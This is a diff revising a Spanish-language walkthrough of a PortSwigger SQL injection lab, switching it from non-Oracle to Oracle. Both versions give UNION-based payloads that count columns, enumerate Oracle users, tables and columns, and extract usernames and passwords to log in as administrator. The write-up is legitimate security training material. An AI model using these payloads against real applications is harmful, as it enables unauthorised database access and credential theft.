@@ -1,26 +1,111 @@
-[Lab: SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
-Hacemos uso de la sentencia `ORDER BY 2` para el listado de las columnas
+# SQL Injection Attack - Listing Database Contents on Oracle
 
-Una vez que nos responde bien, usaremos la sentencia `union select 'a','b' from dual` para visualizar si tenemos las 2 columnas disponibles 
-![[Pasted image 20260331160433.png]]
+## 📌 Lab Information
 
-Ahora listaremos las bases de datos disponibles `union select username,null from all_users`
-![[Pasted image 20260331162533.png]]
+- **Lab:** Listing Database Contents on Oracle
+- **Categoría:** UNION SQL Injection
+- **Motor BD:** Oracle
 
-ahora probaremos listando las tablas `union select table_name,null from all_tables`
-![[Pasted image 20260331162758.png]]
-E identificamos la tabla que dice 'USERS_LETRASALEATORIAS'
-![[Pasted image 20260331163830.png]]
+🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
 
-ahora listaremos las columnas de la tabla: `union select column_name,null from all_tab_columns`
-![[Pasted image 20260331163129.png]]
+---
 
-Ahora listaremos las columnas de la tabla 'USERS_LETRASALEATORIAS' con la sentencia `union select column_name,null from all_tab_columns WHERE table_name='USERS_LETRASALEATORIAS'`
-![[Pasted image 20260331164011.png]]
+## 🎯 Objetivo
 
-Y por ultimo listaremos el usuario y las password de las columnas de la tabla USERS_LETRASALEATORIAS
-`union select USERNAME_LETRASALEATORIAS,PASSWORD_LEATRASALEATORIAS from USERS_LETRASALEATORIAS`
-![[Pasted image 20260331170718.png]]
+Enumerar tablas, columnas y extraer credenciales desde una base de datos Oracle.
 
-y con esto iniciaremos sesion para completar el reto:
-![[Pasted image 20260331171027.png]]
+---
+
+## 🔍 Enumeración de columnas
+
+Utilizamos:
+
+```sql
+' ORDER BY 2 -- -
+```
+
+Posteriormente validamos columnas visibles:
+
+```sql
+' union select 'a','b' from dual --
+```
+
+![Validación columnas](Imagenes/pasted-image-20260331160433.png)
+
+---
+
+## 🚀 Listado de usuarios Oracle
+
+```sql
+' union select username,null from all_users --
+```
+
+![Usuarios Oracle](Imagenes/pasted-image-20260331162533.png)
+
+---
+
+## 🚀 Listado de tablas
+
+```sql
+' union select table_name,null from all_tables --
+```
+
+![Listado tablas](Imagenes/pasted-image-20260331162758.png)
+
+---
+
+## 🔍 Tabla objetivo
+
+Identificamos la tabla:
+
+```text
+USERS_LETRASALEATORIAS
+```
+
+![Tabla users](Imagenes/pasted-image-20260331163830.png)
+
+---
+
+## 🚀 Listado de columnas
+
+```sql
+' union select column_name,null from all_tab_columns --
+```
+
+![Columnas Oracle](Imagenes/pasted-image-20260331163129.png)
+
+---
+
+## 🔍 Columnas de la tabla users
+
+```sql
+' union select column_name,null from all_tab_columns WHERE table_name='USERS_LETRASALEATORIAS' --
+```
+
+![Columnas users](Imagenes/pasted-image-20260331164011.png)
+
+---
+
+## 🚀 Extracción de credenciales
+
+```sql
+' union select USERNAME_LETRASALEATORIAS,PASSWORD_LETRASALEATORIAS from USERS_LETRASALEATORIAS --
+```
+
+![Credenciales Oracle](Imagenes/pasted-image-20260331170718.png)
+
+---
+
+## 🔓 Acceso administrador
+
+![Login administrador](Imagenes/pasted-image-20260331171027.png)
+
+---
+
+## ✅ Resultado
+
+Se logró:
+- Enumerar tablas Oracle
+- Enumerar columnas
+- Extraer credenciales
+- Acceder como administrador
